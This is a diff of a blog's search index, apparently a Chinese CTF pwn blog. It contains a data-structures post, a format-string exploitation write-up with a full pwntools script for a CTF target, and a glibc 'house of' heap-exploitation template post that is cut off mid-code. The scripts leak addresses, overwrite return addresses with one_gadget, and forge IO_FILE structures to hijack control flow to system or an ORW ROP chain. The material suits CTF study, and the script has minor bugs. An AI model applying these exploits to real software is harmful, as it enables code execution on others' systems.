@@ -1,144 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>format利用</title>
-    <url>/2024/07/20/Fmt/</url>
-    <content><![CDATA[<hr>
-<h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><span id="more"></span>
-<p>详细学习关于fmt的利用手法推荐b站国资，以及星盟</p>
-<p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
-<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
-<p>_printf_chk与printf主要有以下几点不同：   </p>
-<pre><code>1、在使用%n$p时要连续进行打印，如打印%1$p,就需要%1$p,%2$p连续使用。
-2、在使用%n时会进行一些检查。
-</code></pre>
-<p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
-<p>6、*<br>eg：%*7$c+%6$hnn<br>上面这个例子的作用就是将栈上第7个的位置的值直接输入到6p这个位置。<br>通常用于read字节较少的情况。<br><br><br><br></p>
-<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
-<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
-</code></pre>
-<p>首先程序会对函数依次进行以下操作：  </p>
-<pre><code>1、读取内容   
-2、如果遇到的是普通字符串则输入到缓冲区中      
-3、如果遇到的是以%开头或转义字符，则程序进行解析，并作出与之对应的操作    
-</code></pre>
-<p>进行完这些程序就会打印出下面的结果<br><img src="/images/result.png" alt="图片"><br>第一个地址是“test”的地址，第二个地址是变量a的地址。<br>根据以上的规律我们不难发现利用%p，pritnf就会依次从esp-4的位置打印出地址。<br> 同时我们也可以了解到在使用类如  ”%n$p”  的n参数代表的是相较于格式化字符串的相对位置。</p>
-<p>根据以上的例子我们可以知道printf的基本原理，那么利用printf也就一目了然了，printf的利用也是无非在原理的基础利用程序本身的逻辑漏洞，或函数漏洞来进行攻击。<br><br><br><br></p>
-<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>1、在64位程序中我们知道，程序改为先用寄存器来进行依次传参，所以原本的</p>
-<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
-</code></pre>
-<p>就会将%p先存储在rdi中然后剩下的参数就按顺序依次存储在剩下的5个寄存器中。  </p>
-<p>所以64位中若是想要泄露栈上的地址应该要先从  %6$p 开始。  </p>
-<p>2、除了寄存器传参剩下就和32位程序一致了。   </p>
-<br>
-<br>   
-                        
-<p>2、<br>先可以通过例题回忆一下<br>DASCTF<br><img src="/images/dactf_fmtN.png" alt="图片"><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
-<pre><code>!/usr/bin/python3
-from pwn import *
-from LibcSearcher import *
-import os
-
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
-# context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
-
-
-#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
-context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
-#终端更换
-
-p=process(&quot;./pwn&quot;)
-p= remote(&#39;node5.buuoj.cn&#39;,28406)
-libc = ELF(&quot;libc.so.6&quot;)
-elf = ELF(&quot;./pwn&quot;)
-
-def op():
-    gdb.attach(p)
-    pause()
-
-def inter():
-    p.interactive()
-    
-def sa(content,payload):
-    p.sendafter(content,payload)
-    
-def sla(content,payload):
-    p.sendlineafter(content,payload)
-
-def uc64():
-    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
-
-def uc32():
-    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
-
-def exec_fmt(pad):#自动获取到fmt的pad
-    p = process(&quot;./fmt&quot;)
-    # send 还是 sendline以程序为准
-    p.send(pad)
-    return p.recv()
-payload=b&#39;%3$p&#39;+b&#39;%6$p&#39;
-sa(&quot;keyword&quot;,payload)
-p.recvuntil(b&#39;0x&#39;)
-got=int(p.recv(12),16)-0x10-libc.sym[&#39;read&#39;]
-print(&quot;got=&quot;,hex(got))
-p.recvuntil(b&#39;0x&#39;)
-stack=int(p.recv(12),16)-0xc8+0x10
-tar=stack+0xe0-0x100
-print(&quot;tar=&quot;,hex(tar))
-print(&quot;stack=&quot;,hex(stack))
-p.recvuntil(b&#39;0x&#39;)
-one=got+0xf1247
-print(&quot;one=&quot;,hex(one))
-
-
-payload=(b&#39;%&#39;+str(tar&amp;0xffff).encode()+b&#39;c%11$hn\x00&#39;)
-p.recvuntil(b&#39;keyword&#39;)
-print(&quot;offest=&quot;,hex(offest))
-p.send(payload)
-#改写当前链为ret的链
-
-payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
-p.recvuntil(b&#39;keyword&#39;)
-p.send(payload)
-p.recv()
- #改ret第二位为one
-
-payload=(b&#39;%&#39;+str((tar&amp;0xffff)+2).encode()+b&#39;c%11$hn\x00&#39;)
-p.recvuntil(b&#39;keyword&#39;)
-print(&quot;offest=&quot;,hex(offest))
-p.send(payload)
-#ret地址+2
-
-print(&quot;offest=&quot;,hex(offest))
-one=one&gt;&gt;16
-payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
-print(&quot;offest=&quot;,hex(offest))
-p.recvuntil(b&#39;keyword&#39;)
-p.send(payload)
-#改ret地址+2的第二位地址为one
-
-inter()
-</code></pre>
-<p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
-<p><img src="/images/gdb_fmt.png" alt="图片"></p>
-<p>可以看到ret链的是__libc_start_main函数，只有这一个所以没办法直接改。<br>不过我们看到后面有一条调用链，有两个一个以上的调用，所以可以将这个后面的调用链改成ret的调用链，即将 0x7fffffffe57c 改为 0x7fffffffe218,这样就会链上ret链。</p>
-<p><img src="/images/fmt_ret.png" alt="图片"></p>
-<p>像这样这就链起来辣！<br>链起来之后就只要修改<br><img src="/images/gdb_ret.png" alt="图片"><br>将这一部分修改为onegadget就可以了，其中在修改时很大概率不能四字节一起修，但是one与ret的地址又有三字节不相同，所以需要两字节修改两次，或者一字节修改三次。这时需要ret地址+1或2来对剩下的地址再次进行修改。        </p>
-<p>修改完之后就可以getshell了。</p>
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>fmt</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Data_Structure</title>
     <url>/2024/09/26/Data-Structure/</url>
     <content><![CDATA[<h1 id="Data-Structure"><a href="#Data-Structure" class="headerlink" title="Data_Structure"></a>Data_Structure</h1><span id="more"></span>
 
 <h1 id="Data-List"><a href="#Data-List" class="headerlink" title="Data_List"></a>Data_List</h1><br>
 
+<p><strong><em>没有技巧，全是粘贴</em></strong><br><br></p>
 <h2 id="List-Create"><a href="#List-Create" class="headerlink" title="List_Create"></a>List_Create</h2><h2 id="1、单链表-循环单链表"><a href="#1、单链表-循环单链表" class="headerlink" title="1、单链表&amp;&amp;循环单链表"></a>1、单链表&amp;&amp;循环单链表</h2><br>
 
 <h3 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h3><pre><code>void CreateListR(LinkNode *&amp;L，ElemType a[]，int n)
@@ -197,7 +66,7 @@ for (i=0;i&lt;n;i++)		//循环建立数据结点
 &#125;
 </code></pre>
 <p><img src="/images/List/3.png" alt="图片"><br><img src="/images/List/4.png" alt="图片"><br><br></p>
-<h2 id="Stack-Queue"><a href="#Stack-Queue" class="headerlink" title="Stack&amp;&amp;Queue"></a>Stack&amp;&amp;Queue</h2><h3 id="1、Stack"><a href="#1、Stack" class="headerlink" title="1、Stack"></a>1、Stack</h3><br>
+<h2 id="Stack-Queue"><a href="#Stack-Queue" class="headerlink" title="Stack&amp;&amp;Queue"></a>Stack&amp;&amp;Queue</h2><h2 id="1、Stack"><a href="#1、Stack" class="headerlink" title="1、Stack"></a>1、Stack</h2><br>
 
 <h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>(1)Init</p>
 <pre><code>void InitStack(SqStack *&amp;s)
@@ -302,7 +171,7 @@ return true;
 </code></pre>
 <br>
 
-<h3 id="2、Queue"><a href="#2、Queue" class="headerlink" title="2、Queue"></a>2、Queue</h3><h3 id="顺序表-循环队列"><a href="#顺序表-循环队列" class="headerlink" title="顺序表&amp;&amp;循环队列"></a>顺序表&amp;&amp;循环队列</h3><p>（1）初始化队列InitQueue(q)<br>   构造一个空队列q。将front和rear指针均设置成初始状态即-1值。</p>
+<h2 id="2、Queue"><a href="#2、Queue" class="headerlink" title="2、Queue"></a>2、Queue</h2><h3 id="顺序表-循环队列"><a href="#顺序表-循环队列" class="headerlink" title="顺序表&amp;&amp;循环队列"></a>顺序表&amp;&amp;循环队列</h3><p>（1）初始化队列InitQueue(q)<br>   构造一个空队列q。将front和rear指针均设置成初始状态即-1值。</p>
 <pre><code>void InitQueue(SqQueue *&amp;q)
 &#123;  q=(SqQueue *)malloc (sizeof(SqQueue));
 　 q-&gt;front=q-&gt;rear=-1;
@@ -475,6 +344,138 @@ return true;
 <h3 id="3、双端队列"><a href="#3、双端队列" class="headerlink" title="3、双端队列"></a>3、双端队列</h3>]]></content>
       <tags>
         <tag>Data_Structure</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>format利用</title>
+    <url>/2024/07/20/Fmt/</url>
+    <content><![CDATA[<hr>
+<h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><span id="more"></span>
+<p>详细学习关于fmt的利用手法推荐b站国资，以及星盟</p>
+<p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
+<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
+<p>_printf_chk与printf主要有以下几点不同：   </p>
+<pre><code>1、在使用%n$p时要连续进行打印，如打印%1$p,就需要%1$p,%2$p连续使用。
+2、在使用%n时会进行一些检查。
+</code></pre>
+<p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
+<p>6、*<br>eg：%*7$c+%6$hnn<br>上面这个例子的作用就是将栈上第7个的位置的值直接输入到6p这个位置。<br>通常用于read字节较少的情况。<br><br><br><br></p>
+<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
+<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
+</code></pre>
+<p>首先程序会对函数依次进行以下操作：  </p>
+<pre><code>1、读取内容   
+2、如果遇到的是普通字符串则输入到缓冲区中      
+3、如果遇到的是以%开头或转义字符，则程序进行解析，并作出与之对应的操作    
+</code></pre>
+<p>进行完这些程序就会打印出下面的结果<br><img src="/images/result.png" alt="图片"><br>第一个地址是“test”的地址，第二个地址是变量a的地址。<br>根据以上的规律我们不难发现利用%p，pritnf就会依次从esp-4的位置打印出地址。<br> 同时我们也可以了解到在使用类如  ”%n$p”  的n参数代表的是相较于格式化字符串的相对位置。</p>
+<p>根据以上的例子我们可以知道printf的基本原理，那么利用printf也就一目了然了，printf的利用也是无非在原理的基础利用程序本身的逻辑漏洞，或函数漏洞来进行攻击。<br><br><br><br></p>
+<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>1、在64位程序中我们知道，程序改为先用寄存器来进行依次传参，所以原本的</p>
+<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
+</code></pre>
+<p>就会将%p先存储在rdi中然后剩下的参数就按顺序依次存储在剩下的5个寄存器中。  </p>
+<p>所以64位中若是想要泄露栈上的地址应该要先从  %6$p 开始。  </p>
+<p>2、除了寄存器传参剩下就和32位程序一致了。   </p>
+<br>
+<br>   
+                        
+<p>2、<br>先可以通过例题回忆一下<br>DASCTF<br><img src="/images/dactf_fmtN.png" alt="图片"><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
+<pre><code>!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+import os
+
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+
+
+#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
+context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
+#终端更换
+
+p=process(&quot;./pwn&quot;)
+p= remote(&#39;node5.buuoj.cn&#39;,28406)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./pwn&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+    
+def sa(content,payload):
+    p.sendafter(content,payload)
+    
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
+
+def exec_fmt(pad):#自动获取到fmt的pad
+    p = process(&quot;./fmt&quot;)
+    # send 还是 sendline以程序为准
+    p.send(pad)
+    return p.recv()
+payload=b&#39;%3$p&#39;+b&#39;%6$p&#39;
+sa(&quot;keyword&quot;,payload)
+p.recvuntil(b&#39;0x&#39;)
+got=int(p.recv(12),16)-0x10-libc.sym[&#39;read&#39;]
+print(&quot;got=&quot;,hex(got))
+p.recvuntil(b&#39;0x&#39;)
+stack=int(p.recv(12),16)-0xc8+0x10
+tar=stack+0xe0-0x100
+print(&quot;tar=&quot;,hex(tar))
+print(&quot;stack=&quot;,hex(stack))
+p.recvuntil(b&#39;0x&#39;)
+one=got+0xf1247
+print(&quot;one=&quot;,hex(one))
+
+
+payload=(b&#39;%&#39;+str(tar&amp;0xffff).encode()+b&#39;c%11$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.send(payload)
+#改写当前链为ret的链
+
+payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+p.send(payload)
+p.recv()
+ #改ret第二位为one
+
+payload=(b&#39;%&#39;+str((tar&amp;0xffff)+2).encode()+b&#39;c%11$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.send(payload)
+#ret地址+2
+
+print(&quot;offest=&quot;,hex(offest))
+one=one&gt;&gt;16
+payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.recvuntil(b&#39;keyword&#39;)
+p.send(payload)
+#改ret地址+2的第二位地址为one
+
+inter()
+</code></pre>
+<p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
+<p><img src="/images/gdb_fmt.png" alt="图片"></p>
+<p>可以看到ret链的是__libc_start_main函数，只有这一个所以没办法直接改。<br>不过我们看到后面有一条调用链，有两个一个以上的调用，所以可以将这个后面的调用链改成ret的调用链，即将 0x7fffffffe57c 改为 0x7fffffffe218,这样就会链上ret链。</p>
+<p><img src="/images/fmt_ret.png" alt="图片"></p>
+<p>像这样这就链起来辣！<br>链起来之后就只要修改<br><img src="/images/gdb_ret.png" alt="图片"><br>将这一部分修改为onegadget就可以了，其中在修改时很大概率不能四字节一起修，但是one与ret的地址又有三字节不相同，所以需要两字节修改两次，或者一字节修改三次。这时需要ret地址+1或2来对剩下的地址再次进行修改。        </p>
+<p>修改完之后就可以getshell了。</p>
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>fmt</tag>
       </tags>
   </entry>
   <entry>
@@ -757,6 +758,541 @@ _IO_str_jumps
         <tag>pwn</tag>
         <tag>IO</tag>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house of模板</title>
+    <url>/2024/07/25/house%20of/</url>
+    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
+
+<hr>
+<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
+<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
+<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
+next_chain = 0
+fake_IO_FILE=p64(rdi)         #_flags=rdi
+fake_IO_FILE+=p64(0)*7
+fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
+fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
+fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
+fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
+fake_IO_FILE += p64(0)  # _chain
+fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
+fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
+fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
+fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
+fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
+fake_IO_FILE += p64(1) #mode=1
+fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
+fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
+fake_IO_FILE +=p64(0)*6
+fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
+</code></pre>
+<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
+<br>
+
+<p>例子orw：  </p>
+<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
+Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
+Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
+Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
+Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
+Fake_IO_File_Structure._offset = 0
+Fake_IO_File_Structure._vtable_offset = 0
+Fake_IO_File_Structure._mode = 1
+Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
+
+Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
+Fake_IO_File_Structure += p64(0) * 6
+Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
+Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
+rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
+
+Fake_IO_File_Structure += rop
+</code></pre>
+<br>
+<br> 
+
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
+<p><em>利用流程：</em></p>
+<pre><code>修改topchunk_size为0xffffffffffffffff
+计算target_size=target_addrtopchunk_addr-0x30
+malloc一个chunk
+getshell
+ 
+ 
+</code></pre>
+<br>
+ 
+<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
+<br>
+<em>适用版本</em>    
+glibc:2.34-         
+
+<br>
+<em>条件</em>                               
+
+<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
+<br>
+<br>
+
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
+<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
+<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
+_IO_wfile_underflow_mmap
+_IO_wdefault_xsgetn
+</code></pre>
+<br>
+
+<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
+<pre><code>_IO_wfile_overflow
+    _IO_wdoallocbuf
+        _IO_WDOALLOCATE
+            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
+</code></pre>
+<br>
+<em>伪造file及_IO_wide_date_</em>
+
+<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
+vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<p><em>条件绕过</em>        </p>
+<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
+需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
+</code></pre>
+<br>
+    模板（getshell）
+<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
+
+
+<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
+    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
+    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
+    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
+    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
+    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
+    
+</code></pre>
+<br>
+<br>
+
+<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
+<br>
+<em>伪造</em>   
+
+<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
+vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
+_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<br>
+<em>条件绕过</em>       
+
+<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
+</code></pre>
+<br>
+
+<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
+<pre><code>_IO_wdefault_xsgetn
+    __wunderflow
+        _IO_switch_to_wget_mode
+            _IO_WOVERFLOW
+                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
+</code></pre>
+<br>
+<em>伪造</em>       
+
+<pre><code>_flags设置为0x800
+vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
+_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
+</code></pre>
+<br>
+
+<p><em>条件绕过</em>   </p>
+<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
